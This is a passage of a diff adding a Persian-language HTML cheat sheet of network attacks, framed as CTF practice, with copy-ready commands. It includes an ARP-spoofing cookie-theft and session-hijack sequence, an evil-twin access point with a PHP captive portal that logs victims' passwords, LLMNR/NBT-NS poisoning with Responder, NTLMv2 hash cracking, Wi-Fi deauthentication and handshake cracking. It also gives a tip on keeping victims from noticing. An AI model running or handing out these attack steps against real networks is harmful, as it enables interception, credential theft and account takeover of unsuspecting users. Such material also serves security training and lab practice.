+tshark -r capture.pcap -Y "ntlmssp" -T fields -e ntlmssp.domain -e ntlmssp.user
+
+# تحلیل Telnet
+tcpdump -i eth0 -A -s 0 'tcp port 23'</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 7 -->
+        <section id="phase7" class="tool-section">
+            <h2 class="tool-title">🛠️ فاز ۷: ابزارهای پیشرفته شبکه</h2>
+            
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ابزار</th>
+                            <th>کاربرد</th>
+                            <th>دستورات مهم</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><strong>Ettercap</strong></td><td>MITM, Sniffing</td><td><code>-T -M arp:remote</code></td></tr>
+                        <tr><td><strong>Bettercap</strong></td><td>MITM مدرن</td><td><code>arp.spoof, net.sniff, https.proxy</code></td></tr>
+                        <tr><td><strong>Wireshark</strong></td><td>تحلیل ترافیک</td><td>فیلترهای HTTP, DNS, etc.</td></tr>
+                        <tr><td><strong>Tcpdump</strong></td><td>شنود خط فرمان</td><td><code>-i -A -s 0</code></td></tr>
+                        <tr><td><strong>Aircrack-ng</strong></td><td>WiFi Security</td><td><code>airmon-ng, airodump-ng</code></td></tr>
+                        <tr><td><strong>Fluxion</strong></td><td>Evil Twin اتوماتیک</td><td><code>./fluxion.sh</code></td></tr>
+                        <tr><td><strong>Yersinia</strong></td><td>حملات به پروتکل‌ها</td><td><code>dhcp, vlan, rip</code></td></tr>
+                        <tr><td><strong>Responder</strong></td><td>LLMNR/NBT-NS Poisoning</td><td><code>./Responder.py -I eth0</code></td></tr>
+                        <tr><td><strong>Hashcat</strong></td><td>کرک هش</td><td><code>-m 2500 WPA, -m 16800 PMKID</code></td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- Phase 8 -->
+        <section id="phase8" class="tool-section">
+            <h2 class="tool-title">📊 فاز ۸: سناریوهای عملی CTF</h2>
+            
+            <h3 class="sub-title">سناریو ۱: ربودن کوکی مدیر</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># 1. شروع MITM
+ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1//
+
+# 2. شنود کوکی
+tcpdump -i eth0 -A -s 0 'tcp port 80' | grep -E "Cookie|Set-Cookie" &gt; cookies.txt
+
+# 3. استخراج کوکی
+grep "PHPSESSID=" cookies.txt | cut -d= -f2 | uniq
+
+# 4. استفاده از کوکی
+curl -b "PHPSESSID=abc123" http://target.com/admin</code></pre>
+            </div>
+
+            <h3 class="sub-title">سناریو ۲: Evil Twin + Captive Portal</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">php</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-php">// 1. راه‌اندازی AP جعلی و NAT
+// airbase-ng -e "FreeWiFi" -c 6 wlan0mon
+// ifconfig at0 10.0.0.1/24
+// echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+// iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+// dnsmasq -i at0 --dhcp-range=10.0.0.2,10.0.0.200,255.255.255.0
+
+// 4. Captive Portal (PHP)
+&lt;?php
+if(isset($_POST['password'])) {
+    file_put_contents('passwords.txt', $_POST['password']."\n", FILE_APPEND);
+    echo "&lt;h1&gt;Connected!&lt;/h1&gt;&lt;script&gt;setTimeout(function(){location.href='https://google.com';},3000);&lt;/script&gt;";
+} else {
+    echo '&lt;h1&gt;Login to WiFi&lt;/h1&gt;&lt;form method="POST"&gt;&lt;input type="password" name="password"&gt;&lt;input type="submit"&gt;&lt;/form&gt;';
+}
+?&gt;
+
+// 5. راه‌اندازی وب‌سرور
+// php -S 0.0.0.0:80</code></pre>
+            </div>
+
+            <h3 class="sub-title">سناریو ۳: LLMNR/NBT-NS Poisoning (با Responder)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># 1. راه‌اندازی Responder
+responder -I eth0 -w -r -d -v
+
+# 2. قربانی سعی می‌کند به یک share وصل شود
+# net use \\SOMESHARE /user:user pass
+
+# 3. Responder هش را دریافت می‌کند
+# 4. کرک کردن هش (NTLMv2)
+hashcat -m 5600 responder.hash rockyou.txt</code></pre>
+            </div>
+        </section>
+
+        <!-- Checklist -->
+        <section id="checklist" class="tool-section">
+            <h2 class="tool-title">✅ چک‌لیست نهایی CTF شبکه</h2>
+            
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 1: آماده‌سازی</h3>
+                <ul>
+                    <li><code>ip a</code> (شناسایی interface)</li>
+                    <li><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code> (IP forwarding)</li>
+                    <li><code>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</code> (NAT)</li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 2: شناسایی</h3>
+                <ul>
+                    <li><code>arp-scan --local</code> (دستگاه‌های شبکه)</li>
+                    <li><code>nmap -sn 192.168.1.0/24</code> (شناسایی)</li>
+                    <li><code>netdiscover -r 192.168.1.0/24</code> (شناسایی)</li>
+                    <li><code>airmon-ng start wlan0</code> (برای WiFi)</li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 3: MITM</h3>
+                <ul>
+                    <li><code>arpspoof -i eth0 -t target gateway</code> (ARP Spoof)</li>
+                    <li><code>ettercap -T -M arp:remote /target// /gateway//</code> (ARP Spoof)</li>
+                    <li><code>dns.spoof</code> (DNS Spoof)</li>
+                    <li><code>https.proxy.sslstrip</code> (SSL Strip)</li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 4: Sniffing</h3>
+                <ul>
+                    <li><code>tcpdump -i eth0 -A -s 0 'tcp port 80'</code> (HTTP)</li>
+                    <li><code>tcpdump -i eth0 -vvv port 53</code> (DNS)</li>
+                    <li><code>tcpdump -i eth0 -A -s 0 'tcp port 21'</code> (FTP)</li>
+                    <li>Wireshark filters (http, dns, smb)</li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 5: Session Hijacking</h3>
+                <ul>
+                    <li>استخراج کوکی‌ها</li>
+                    <li>استفاده با <code>curl</code> یا مرورگر</li>
+                    <li>تست Session Fixation</li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 6: WiFi (اختیاری)</h3>
+                <ul>
+                    <li><code>airodump-ng wlan0mon</code> (شناسایی)</li>
+                    <li><code>airodump-ng -c 6 --bssid XX:XX -w capture wlan0mon</code> (گرفتن)</li>
+                    <li><code>aireplay-ng -0 5 -a XX:XX wlan0mon</code> (Deauth)</li>
+                    <li><code>aircrack-ng -w rockyou.txt capture-01.cap</code> (Crack)</li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 7: Bypass</h3>
+                <ul>
+                    <li>HSTS Bypass</li>
+                    <li>Captive Portal</li>
+                    <li>Evil Twin</li>
+                    <li>Responder (LLMNR/NBT-NS)</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- Tips -->
+        <section id="tips" class="tool-section">
+            <h2 class="tool-title">💡 نکات طلایی پیشرفته برای CTF</h2>
+            
+            <div class="tip-box">
+                <ol>
+                    <li><strong>IP Forwarding را فراموش نکنید:</strong> بدون آن، قربانی اینترنت ندارد و متوجه می‌شود</li>
+                    <li><strong>فیلترهای Wireshark را حفظ کنید:</strong> سرعت تحلیل را چند برابر می‌کند</li>
+                    <li><strong>هدفمند باشید:</strong> در CTF معمولاً یک دستگاه خاص هدف است</li>
+                    <li><strong>ترافیک را ذخیره کنید:</strong> همیشه <code>-w</code> در tcpdump برای تحلیل بعدی</li>
+                    <li><strong>از ترکیب روش‌ها استفاده کنید:</strong> ARP Spoofing + DNS Spoofing + SSL Strip</li>
+                    <li><strong>به پروتکل‌های خاص توجه کنید:</strong> FTP, Telnet, HTTP (غیر امن) - زودتر نتیجه می‌دهند</li>
+                    <li><strong>در WiFi: اگر Handshake گرفتید، حتماً آن را ذخیره کنید</strong></li>
+                    <li><strong>از تکنیک‌های دور زدن استفاده کنید:</strong> HSTS Bypass, Captive Portal Bypass</li>
+                    <li><strong>همیشه log داشته باشید:</strong> برای گزارش نهایی</li>
+                    <li><strong>با ابزارهای مختلف تست کنید:</strong> اگر یکی جواب نداد، دیگری را امتحان کنید</li>
+                </ol>
+            </div>
+        </section>
+
+        <!-- Recommended Machines -->
+        <section id="machines" class="tool-section">
+            <h2 class="tool-title">🏆 ماشین‌های پیشنهادی CTF برای تمرین شبکه</h2>
+            
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>سطح</th>
+                            <th>ماشین/تمرین</th>
+                            <th>تکنیک‌های اصلی</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td>مبتدی</td><td>Test network Lab</td><td>ARP Spoofing, HTTP sniffing</td></tr>
+                        <tr><td>مبتدی-متوسط</td><td>WiFi Lab</td><td>WPA Handshake, Deauth</td></tr>
+                        <tr><td>متوسط</td><td>TryHackMe: Network Security</td><td>MITM, Sniffing</td></tr>
+                        <tr><td>متوسط-پیشرفته</td><td>HackTheBox: Network</td><td>DNS Spoofing, SSL Strip</td></tr>
+                        <tr><td>پیشرفته</td><td>HTB: Forest</td><td>LLMNR/NBT-NS Poisoning</td></tr>
+                        <tr><td>حرفه‌ای</td><td>HTB: Active Directory</td><td>SMB, Kerberos</td></tr>
+                        <tr><td>افسانه‌ای</td><td>Network CTF Challenges</td><td>ترکیب تمام روش‌ها</td></tr>
+                    </tbody>
+                </table>
+            </div>
+            <div class="goal-box" style="text-align: center; margin-top: 20px;">
+                <strong>"شبکه یک لایه جدید از حمله است. هر بسته‌ای که عبور می‌کند، یک فرصت است."</strong><br>
+                این چیت‌شیت تمام تکنیک‌های حملات شبکه، شنود، MITM و امنیت WiFi را پوشش می‌دهد.<br>
+                <strong>موفق باشید و هک لذت‌بخشی داشته باشید! 🔥🌐🔒</strong>
+            </div>
+        </section>
+
+    </main>
+
+    <script>
+        // Initialize Highlight.js
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.querySelectorAll('pre code').forEach((block) => {
+                hljs.highlightBlock(block);
+            });
+        });
+
+        // Copy to Clipboard Function (Safely decodes HTML entities back to original code for copying)
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-container').querySelector('code');
+            const textArea = document.createElement('textarea');
+            textArea.value = codeBlock.innerText; 
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+
+            btn.innerText = '✓ کپی شد';
+            btn.style.background = '#39d0d8';
+            btn.style.color = '#000';
+            btn.style.borderColor = '#39d0d8';
+            
+            setTimeout(() => {
+                btn.innerText = 'کپی';
+                btn.style.background = '';
+                btn.style.color = '';
+                btn.style.borderColor = '';
+            }, 2000);
+        }
+
+        // Live Search Filter
+        function filterTools() {
+            const input = document.getElementById('searchInput').value.toLowerCase();
+            const listItems = document.querySelectorAll('.nav-list li');
+            
+            listItems.forEach(item => {
+                const text = item.textContent.toLowerCase();
+                if (text.includes(input)) {
+                    item.style.display = '';
+                } else {
+                    item.style.display = 'none';
+                }
+            });
+        }
+
+        // ScrollSpy Implementation
+        const sections = document.querySelectorAll('.tool-section');
+        const navLinks = document.querySelectorAll('.nav-list a');
+
+        window.addEventListener('scroll', () => {
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                if (pageYOffset >= sectionTop - 50) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            navLinks.forEach(a => {
+                a.classList.remove('active');
+                if (a.getAttribute('href') === '#' + current) {
+                    a.classList.add('active');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
